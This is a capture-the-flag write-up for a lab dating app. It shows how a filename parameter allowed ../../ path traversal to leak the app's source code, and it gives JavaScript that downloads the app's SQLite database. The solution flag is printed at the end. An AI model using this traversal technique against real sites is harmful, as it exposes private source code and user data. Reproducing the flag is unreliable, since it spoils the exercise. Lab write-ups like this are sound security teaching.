**DESCRIPTION**


There’s this new dating app called “Valenfind” that just popped up out of nowhere. I hear the creator only learned to code this year; surely this must be vibe-coded. Can you exploit it?  You can access it here: http://10.113.187.116:5000

**HOW TO SOLVE?**

I noticed a URL parameter (?layout=theme_classic.html) that looked like a filename. This is a "red flag" suggesting the server fetches files dynamically from the disk based on user input.
By injecting "dot-dot-slash" sequences (../../), I attempted to "escape" the intended directory (likely /templates/) to reach the root of the application.

<img width="1024" height="605" alt="image" src="https://github.com/user-attachments/assets/3ccc4439-3624-4433-afb7-fcad94ce812d" />
By reading the leaked app.py code I identified the database configuration DATABSE: 'cupid.db', so I tried to download the SQLite databse and potentially find the flag.


Put this in the source of the site 

```javascript
fetch('/api/fetch_layout?layout=../../cupid.db')
    .then(response => response.blob()) 
    .then(blob => {
        const url = window.URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = 'cupid.db';         
        document.body.appendChild(a);
        a.click(); 
        window.URL.revokeObjectURL(url);
        console.log("%c[+] Download started", "color: green; font-weight: bold;");
    })
    .catch(err => console.error("[-] Error:", err));
```

Opened it and found the flag.


<img width="1024" height="554" alt="image" src="https://github.com/user-attachments/assets/64c2ac5d-17c7-4473-911f-19617f84e82a" />

**Final Flag:** `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`
